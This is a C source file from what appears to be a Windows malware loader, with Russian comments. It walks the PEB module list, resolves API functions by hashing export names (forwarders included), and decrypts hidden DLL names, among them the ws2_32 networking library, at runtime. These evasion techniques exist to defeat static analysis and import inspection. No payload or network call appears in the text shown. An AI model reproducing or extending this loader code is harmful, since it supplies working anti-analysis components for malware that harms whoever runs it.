// src/loader/api_resolver.c
#include "api_resolver.h"
#include "../common/memory.h"
#include "../common/hashes.h"
#include "strings.h"

// ------------------------------------------------------------
// Хеш-функция имён API (MurmurHash-подобная).
// ------------------------------------------------------------
u32 api_hash(const char* name) {
    u32 h = API_HASH_SEED;
    while (*name) {
        h = (h * 0x5BD1E995u) + (u8)*name;
        h ^= (h >> 13);
        h *= 0x85EBCA6Bu;
        name++;
    }
    h ^= (h >> 16);
    return h;
}

// ------------------------------------------------------------
// PEB через gs:[0x60]
// ------------------------------------------------------------
void* get_peb(void) {
    void* peb = NULL_;
    __asm__ __volatile__ (
        "movq %%gs:0x60, %0"
        : "=r"(peb)
    );
    return peb;
}

// ------------------------------------------------------------
// Сравнение UNICODE_STRING (UTF-16) с ASCII-строкой, case-insensitive.
// ------------------------------------------------------------
static int unicode_equals_ascii_ci(const UNICODE_STRING_* us, const char* ascii) {
    if (!us || !us->Buffer || !ascii) return 0;

    u16 wlen = us->Length / 2;
    u16 alen = 0;
    while (ascii[alen]) alen++;

    if (wlen != alen) return 0;

    for (u16 i = 0; i < wlen; i++) {
        u16 wc = us->Buffer[i];
        char ac = ascii[i];

        if (wc >= 'A' && wc <= 'Z') wc += 32;
        if (ac >= 'A' && ac <= 'Z') ac += 32;

        if ((char)wc != ac) return 0;
    }
    return 1;
}

// ------------------------------------------------------------
// Поиск модуля по имени через PEB->Ldr->InMemoryOrderModuleList
// ------------------------------------------------------------
void* get_module_base_by_name(const char* name) {
    void* peb = get_peb();
    if (!peb) return NULL_;

    PEB_* p = (PEB_*)peb;
    PEB_LDR_DATA_* ldr = p->Ldr;
    if (!ldr) return NULL_;

    LIST_ENTRY_* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY_* current = head->Flink;

    while (current && current != head) {
        LDR_DATA_TABLE_ENTRY_* entry = (LDR_DATA_TABLE_ENTRY_*)
            ((u8*)current - 0x10);

        if (entry->BaseDllName.Buffer && entry->DllBase) {
            if (unicode_equals_ascii_ci(&entry->BaseDllName, name)) {
                return entry->DllBase;
            }
        }

        current = current->Flink;
    }
    return NULL_;
}

// ------------------------------------------------------------
// Разрешение API в модуле по хешу имени (с обработкой forwarders).
// ------------------------------------------------------------
void* resolve_api_by_hash(void* module_base, u32 func_hash) {
    if (!module_base) return NULL_;

    IMAGE_DOS_HEADER_* dos = (IMAGE_DOS_HEADER_*)module_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL_;

    IMAGE_NT_HEADERS64_* nt = (IMAGE_NT_HEADERS64_*)((u8*)module_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL_;

    IMAGE_DATA_DIRECTORY_* exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress || !exp_dir->Size) return NULL_;

    u32 exp_start_rva = exp_dir->VirtualAddress;
    u32 exp_end_rva   = exp_start_rva + exp_dir->Size;

    IMAGE_EXPORT_DIRECTORY_* exp =
        (IMAGE_EXPORT_DIRECTORY_*)((u8*)module_base + exp_start_rva);

    u32* names    = (u32*)((u8*)module_base + exp->AddressOfNames);
    u16* ordinals = (u16*)((u8*)module_base + exp->AddressOfNameOrdinals);
    u32* funcs    = (u32*)((u8*)module_base + exp->AddressOfFunctions);

    for (u32 i = 0; i < exp->NumberOfNames; i++) {
        const char* fname = (const char*)((u8*)module_base + names[i]);
        if (api_hash(fname) != func_hash) continue;

        u32 func_rva = funcs[ordinals[i]];

        // Forwarder?
        if (func_rva >= exp_start_rva && func_rva < exp_end_rva) {
            const char* fwd = (const char*)((u8*)module_base + func_rva);
            const char* dot = fwd;
            while (*dot && *dot != '.') dot++;
            if (!*dot) return NULL_;

            char dll_name[64];
            u32 n = 0;
            const char* p = fwd;
            while (*p && *p != '.' && n < 60) {
                dll_name[n++] = *p++;
            }
            dll_name[n++] = '.';
            dll_name[n++] = 'd';
            dll_name[n++] = 'l';
            dll_name[n++] = 'l';
            dll_name[n] = 0;

            const char* ffunc = dot + 1;

            void* target_dll = get_module_base_by_name(dll_name);
            if (!target_dll) {
                typedef void* (__stdcall *pLoadLibraryA)(const char*);
                pLoadLibraryA pLL = (pLoadLibraryA)resolve_kernel32(H_LoadLibraryA);
                if (pLL) target_dll = pLL(dll_name);
            }
            if (!target_dll) return NULL_;

            u32 fhash = api_hash(ffunc);
            return resolve_api_by_hash(target_dll, fhash);
        }

        return (void*)((u8*)module_base + func_rva);
    }
    return NULL_;
}

// ------------------------------------------------------------
// Высокоуровневые обёртки с зашифрованными именами DLL
// ------------------------------------------------------------
void* resolve_kernel32(u32 func_hash) {
    static void* k32 = NULL_;
    if (!k32) {
        char buf[32];
        decrypt_string(buf, ENC_KERNEL32, ENC_KERNEL32_SIZE, ENC_KERNEL32_KEY);
        k32 = get_module_base_by_name(buf);
    }
    return resolve_api_by_hash(k32, func_hash);
}

void* resolve_ntdll(u32 func_hash) {
    static void* nt = NULL_;
    if (!nt) {
        char buf[32];
        decrypt_string(buf, ENC_NTDLL, ENC_NTDLL_SIZE, ENC_NTDLL_KEY);
        nt = get_module_base_by_name(buf);
    }
    return resolve_api_by_hash(nt, func_hash);
}

void* resolve_user32(u32 func_hash) {
    static void* u32_ = NULL_;
    if (!u32_) {
        char buf[32];
        decrypt_string(buf, ENC_USER32, ENC_USER32_SIZE, ENC_USER32_KEY);
        u32_ = get_module_base_by_name(buf);
    }
    return resolve_api_by_hash(u32_, func_hash);
}

void* resolve_ws2_32(u32 func_hash) {
    static void* ws2 = NULL_;
    if (!ws2) {
        char buf[32];
        decrypt_string(buf, ENC_WS2_32, ENC_WS2_32_SIZE, ENC_WS2_32_KEY);
        typedef void* (__stdcall *pLoadLibraryA)(const char*);
        pLoadLibraryA pLL = (pLoadLibraryA)resolve_kernel32(H_LoadLibraryA);
        if (!pLL) return NULL_;
        ws2 = pLL(buf);
    }
    return resolve_api_by_hash(ws2, func_hash);
}